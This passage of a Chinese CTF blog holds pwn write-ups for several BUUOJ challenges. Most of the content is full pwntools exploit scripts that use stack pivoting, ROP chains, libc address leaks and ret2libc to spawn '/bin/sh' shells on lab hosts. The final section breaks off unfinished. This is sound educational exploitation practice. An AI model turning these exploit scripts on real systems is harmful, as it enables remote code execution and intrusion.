首先调用了`printf`把我们输入的数据打印出来，但是通过溢出，我们可以让`s`和`ebp`连起来，被`ebp`当做`s`这个字符串的一部分输出出来，获得栈的地址，然后把`esp`跳到`s`上进行迁移就好了

调试找偏移，断在`vul`的`leave`上

```python
payload=b'a'*0x28
p.send(payload)
p.recvuntil(payload)
old_ebp=u32(p.recv(4))
print(hex(old_ebp))



payload=b'b'*0x28
payload+=p32(old_ebp) # 3c
payload+=p32(0x80485FD)
p.sendline(payload)
```

查一下`s`的地址

![](https://files.seeusercontent.com/2026/03/30/Qxh2/20260331020031.png)

跑到第二个`leave;ret`的`ret`上，计算出`s`相对于`ret`地址的偏移

![](https://files.seeusercontent.com/2026/03/30/up0E/20260331020034.png)

同样的再计算一下`/bin/sh`偏移

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./ciscn_2019_es_2',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':28783
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf



p,elf=init()
rop=ROP(elf)
leave=rop.leave.address


payload=b'a'*0x28
p.send(payload)
p.recvuntil(payload)
old_ebp=u32(p.recv(4))
print(hex(old_ebp))

system_plt=elf.plt['system']


payload=p32(system_plt)
payload+=p32(0)
payload+=p32(old_ebp-0x3c+4*4)
payload+=b'/bin/sh\x00'
payload=payload.ljust(0x28)

payload+=p32(old_ebp-0x3c)
payload+=p32(0x80485FD)
p.sendline(payload)




p.interactive()
```

## [HarekazeCTF2019]baby_rop2

栈溢出，`printf`的地址有\`x00`，会被截断，找其他函数的got表，还有3个可以用

![](https://files.seeusercontent.com/2026/03/30/kQ4c/20260331020038.png)

![](https://files.seeusercontent.com/2026/03/30/9Szb/20260331020039.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./babyrop2',
  'remote':1,
  'debug':0,
  'log':1,
  'host':'node5.buuoj.cn',
  'port':27770
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


def leak_addr(got_addr,name='addr'):
  payload=b'a'*0x20 #buff
  payload+=b'a'*8 #ebp,rbp
  payload+=p64(pop_rdi)
  payload+=p64(got_addr)
  payload+=p64(printf_plt)
  payload+=p64(main)
  p.sendline(payload)
  p.recvuntil('!\n')
  addr=u64(p.recvuntil("What's your name? ").replace(b"What's your name? ",b'').ljust(8,b'\x00'))
  print(f'{name}: {hex(addr)}')
  return addr


p,elf=init()
rop=ROP(elf)
pop_rdi=rop.rdi.address
ret=rop.ret.address
printf_plt=elf.plt['printf']
read_got=elf.got['read']
main=elf.sym['main']


read_addr=leak_addr(read_got,'read')
libc=ELF('./libc.so.6')
base=read_addr-libc.sym['read']
binsh = base + next(libc.search('/bin/sh'))
system_addr=base+libc.sym['system']



payload=b'a'*0x20 #buff
payload+=b'a'*8 #ebp,rbp
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system_addr)
payload+=p64(main)
p.sendline(payload)


p.interactive()
```

## picoctf_2018_rop chain

栈溢出，通过3个函数打印flag

![](https://files.seeusercontent.com/2026/03/30/Wd0w/20260331020044.png)

![](https://files.seeusercontent.com/2026/03/30/w1Ur/20260331020046.png)

![](https://files.seeusercontent.com/2026/03/30/iTl4/20260331020048.png)

![](https://files.seeusercontent.com/2026/03/30/1riW/20260331020050.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./PicoCTF_2018_rop_chain',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':25737
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf





p,elf=init()

payload=b'a'*0x18
payload+=b'a'*4
payload+=p32(elf.sym['win_function1'])
payload+=p32(elf.sym['win_function2'])
payload+=p32(elf.sym['flag'])
payload+=p32(0xBAAAAAAD)
payload+=p32(0xDEADBAAD)
p.sendline(payload)

p.interactive()
```

## wustctf2020_getshell

栈溢出，只能覆盖到esp，有后门函数

![](https://files.seeusercontent.com/2026/03/30/Wfv6/20260331020053.png)

![](https://files.seeusercontent.com/2026/03/30/ijG1/20260331020055.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./wustctf2020_getshell',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':27549
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf

p,elf=init()

p.sendline(flat(b'a'*0x1c,elf.sym['shell']))


p.interactive()
```

## pwn2_sctf_2016

负数溢出，然后栈溢出

![](https://files.seeusercontent.com/2026/03/30/iqP5/20260331020058.png)

翻到一个系统调用指令，还有寄存器操作指令

![](https://files.seeusercontent.com/2026/03/30/xuZ6/20260331020100.png)

调试一下，看看执行到`ret`时的状态，如果要利用系统调用需要满足表格的条件然后执行`int 0x80`，但是`ebx`不是栈的地址，`bss`段也没有`/bin/sh`

![](https://files.seeusercontent.com/2026/03/30/4Dbq/20260331020104.png)

| 寄存器 | 值            |
| ------ | ------------- |
| eax    | 11            |
| ebx    | /bin/sh的地址 |
| ecx    | 0             |
| edx    | 0             |

有个取栈地址的`gadget`，但是实际利用不了

![](https://files.seeusercontent.com/2026/03/30/Yc1k/20260331020106.png)

老老实实找libc造payload

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./pwn2_sctf_2016',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':27172
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


def leak_addr(got_name,name=None):
  if not name:
    name=got_name
  got_addr=elf.got[got_name]
  payload=[]
  payload.append(b'a'*0x2c) #buff
  payload.append(b'a'*4) #ebp,rbp
  payload.append(printf_plt) 
  payload.append(main) 
  payload.append(got_addr) 
  p.sendline(flat(*payload))
  p.recvuntil('You said: ')
  p.recvline()
  addr=u32(p.recv(4))
  print(f'{name}: {hex(addr)}')
  return addr


p,elf=init()
printf_plt=elf.plt['printf']
main=elf.sym['main']

p.sendline('-1')
start=leak_addr('__libc_start_main')
libc=libcfind.finder('__libc_start_main',start)
system_addr=libc.dump('system')
binsh=libc.dump('str_bin_sh')


p.sendline('-1')
payload=[]
payload.append(b'a'*0x2c) #buff
payload.append(b'a'*4) #ebp,rbp
payload.append(system_addr) 
payload.append(main)
payload.append(binsh) 
p.sendline(flat(*payload))


p.interactive()
```

## jarvisoj_level3

栈溢出，直接`ret2libc`

![](https://files.seeusercontent.com/2026/03/30/5oEh/20260331020110.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./level3',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':27245
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


def leak_addr(got_name,name=None):
  if not name:
    name=got_name
  got_addr=elf.got[got_name]
  payload=[]
  payload.append(b'a'*0x88) #buff
  payload.append(b'a'*4) #ebp,rbp
  payload.append(write_plt) 
  payload.append(main) 
  payload.append(1) 
  payload.append(got_addr) 
  payload.append(4) 
  p.sendline(flat(*payload))
  p.recvuntil('Input:\n')
  addr=u32(p.recv(4))
  print(f'{name}: {hex(addr)}')
  return addr


p,elf=init()
write_plt=elf.plt['write']
main=elf.sym['main']

start=leak_addr('write')
libc=libcfind.finder('write',start)
system_addr=libc.dump('system')
binsh=libc.dump('str_bin_sh')


payload=[]
payload.append(b'a'*0x88) #buff
payload.append(b'a'*4) #ebp,rbp
payload.append(system_addr) 
payload.append(main)
payload.append(binsh) 
p.sendline(flat(*payload))


p.interactive()
```

## ciscn_2019_s_3

栈溢出

![](https://files.seeusercontent.com/2026/03/30/aL9y/20260331020113.png)

`syscall`是系统调用函数

![](https://files.seeusercontent.com/2026/03/30/V9ph/20260331020115.png)

`gadgets`可以单独修改`rax`，我们可以把`rax`设置成15,后调用`syscall`，这被称为`Sigreturn`系统调用

![](https://files.seeusercontent.com/2026/03/30/Hlz5/20260331020117.png)

`Sigreturn`系统调用是用户层需要恢复寄存器产生的，在用户层无法同时修改寄存器为，无法通过不修改其他寄存器的情况下同时

```python

```
